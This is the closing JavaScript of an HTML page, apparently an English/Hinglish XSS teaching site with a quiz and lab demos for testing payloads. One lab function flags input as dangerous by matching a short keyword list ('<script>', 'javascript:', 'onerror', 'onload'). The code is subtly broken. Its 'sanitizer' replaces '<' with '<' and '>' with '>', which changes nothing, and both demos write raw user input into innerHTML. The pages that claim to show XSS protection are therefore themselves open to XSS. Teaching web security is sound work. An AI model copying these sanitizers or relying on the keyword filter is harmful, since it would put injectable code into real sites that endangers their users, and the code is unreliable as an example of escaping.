      showNotification(isHinglish ? `Quiz pura! Score: ${score}/${quizQuestions.length}` : `Quiz complete! You scored ${score}/${quizQuestions.length}`);
    };

    // Notification
    function showNotification(message) {
      const notification = document.getElementById('notification');
      const notificationText = document.getElementById('notification-text');

      // Add null checks to prevent errors
      if (!notification || !notificationText) {
        console.warn('Notification elements not found:', { notification, notificationText });
        return;
      }

      notificationText.textContent = message;
      notification.classList.add('show');
      setTimeout(() => {
        if (notification) notification.classList.remove('show');
      }, 3000);
    }

    // Scroll Progress Bar
    window.addEventListener('scroll', () => {
      const winHeight = window.innerHeight;
      const docHeight = document.documentElement.scrollHeight;
      const scrollTop = window.pageYOffset;
      const trackLength = docHeight - winHeight;
      const progress = scrollTop / trackLength * 100;
      const progressBar = document.getElementById('progress-bar');
      if (progressBar && progressBar.style) {
        progressBar.style.width = progress + '%';
      }
    });

    /* Animation on Scroll */
    document.addEventListener('DOMContentLoaded', () => {
      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) entry.target.classList.add('visible');
        });
      }, { threshold: 0.1 });
      document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
      renderQuiz();
    });

    // Lab functions
    function testXssProtection() {
      const input = document.getElementById('test-input');
      const result = document.getElementById('protection-result');

      // Add null checks
      if (!input || !result) {
        console.warn('XSS protection demo elements not found');
        return;
      }

      const inputValue = input.value;

      // Simulate protection mechanisms
      const protectedOutput = inputValue.replace(/</g, '<').replace(/>/g, '>')
                                       .replace(/"/g, '"').replace(/'/g, '&#39;')
                                       .replace(/javascript:/gi, '');

      result.innerHTML = isHinglish
        ? `Input: ${inputValue}\n\nSanitized Output: ${protectedOutput}\n\n✅ XSS Protection Safal!`
        : `Input: ${inputValue}\n\nSanitized Output: ${protectedOutput}\n\n✅ XSS Protection Successful!`;
    }

    function testLabPayload() {
      const payloadInput = document.getElementById('lab-input');
      const result = document.getElementById('lab-result');

      // Add null checks
      if (!payloadInput || !result) {
        console.warn('Lab payload demo elements not found');
        return;
      }

      const payload = payloadInput.value;

      // Check if payload is dangerous
      if (payload.includes('<script>') || payload.includes('javascript:') ||
          payload.includes('onerror') || payload.includes('onload')) {
        result.innerHTML = isHinglish
          ? `⚠️  XSS Payload Detect Hua!\n\nPayload: ${payload.replace(/</g, '<').replace(/>/g, '>')}\n\nYeh payload khatarnaak ho sakta hai aur block kar diya gaya hai.`
          : `⚠️  XSS Payload Detected!\n\nPayload: ${payload.replace(/</g, '<').replace(/>/g, '>')}\n\nThis payload could be dangerous and has been blocked.`;
      } else {
        result.innerHTML = isHinglish
          ? `✅ Safe Input\n\nInput: ${payload.replace(/</g, '<').replace(/>/g, '>')}\n\nYeh input surakshit hai aur process kiya gaya hai.`
          : `✅ Safe Input\n\nInput: ${payload.replace(/</g, '<').replace(/>/g, '>')}\n\nThis input is safe and has been processed.`;
      }
    }

    function clearLabResults() {
      const resultElement = document.getElementById('lab-result');
      if (!resultElement) {
        console.warn('Lab result element not found');
        return;
      }
      resultElement.textContent = '// Lab results will appear here';
    }

    function setTestPayload(payload) {
      const inputElement = document.getElementById('lab-input');
      if (!inputElement) {
        console.warn('Lab input element not found');
        return;
      }
      inputElement.value = payload;
    }
  </script>
</body>
</html>
